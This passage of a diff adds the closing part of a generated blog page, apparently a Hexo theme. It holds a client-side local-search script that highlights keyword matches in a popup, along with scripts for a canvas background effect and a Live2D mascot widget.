+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
